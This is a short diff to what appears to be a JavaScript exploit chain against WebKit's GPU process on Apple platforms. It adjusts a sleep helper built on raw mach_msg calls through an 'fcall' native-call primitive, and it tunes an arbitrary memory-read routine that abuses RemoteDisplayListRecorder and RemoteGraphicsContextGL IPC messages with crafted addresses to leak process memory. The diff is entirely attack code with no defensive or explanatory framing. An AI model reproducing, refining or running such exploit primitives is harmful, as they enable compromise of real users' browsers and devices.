@@ -7518,12 +7518,14 @@
       if (!RemoteDisplayListRecorder_FillRect(imageBufferIdentifiers[dirtyWriteIndex + 3], 0, 0, 0, 0, true, timeout = crash_timeout)) return false;
       return true;
     }
+    const _yieldBuf = new ArrayBuffer(0x40);
+    const _yieldBufPtr = _yieldBuf.data();
     const _yieldPortBuf = new BigUint64Array(1);
     fcall(offsets.mach_port_allocate, __mach_task_self, 1n, _yieldPortBuf.data());
     const _yieldPort = _yieldPortBuf[0];
     function yieldWait(ms) {
-      fcall(offsets.mach_msg_fn, receiveBufferDataPointer,
-            0x102n, 0n, receiveBufferSizeAsBigInt,
+      fcall(offsets.mach_msg_fn, _yieldBufPtr,
+            0x102n, 0n, 0x40n,
             _yieldPort, BigInt(ms), 0n);
     }
     function iterativeRead(address, size) {
@@ -7536,7 +7538,6 @@
         }
         RemoteDisplayListRecorder_SetCTM(imageBufferIdentifiers[dirtyWriteIndex + 2], size << 32n | 3n, address, 0x0000000049ac480cn, 0n, 0n, 0n);
         if (!RemoteDisplayListRecorder_FillRect(imageBufferIdentifiers[dirtyWriteIndex + 2], 0, 0, 0, 0, true, timeout = crash_timeout)) return false;
-        RemoteImageBuffer_PutPixelBuffer(imageBufferIdentifiers[dirtyWriteIndex + 2], 0x20, 0x80);
         RemoteGraphicsContextGL_Flush();
         RemoteGraphicsContextGL_Finish();
         const leak = RemoteGraphicsContextGL_GetShaderSource();
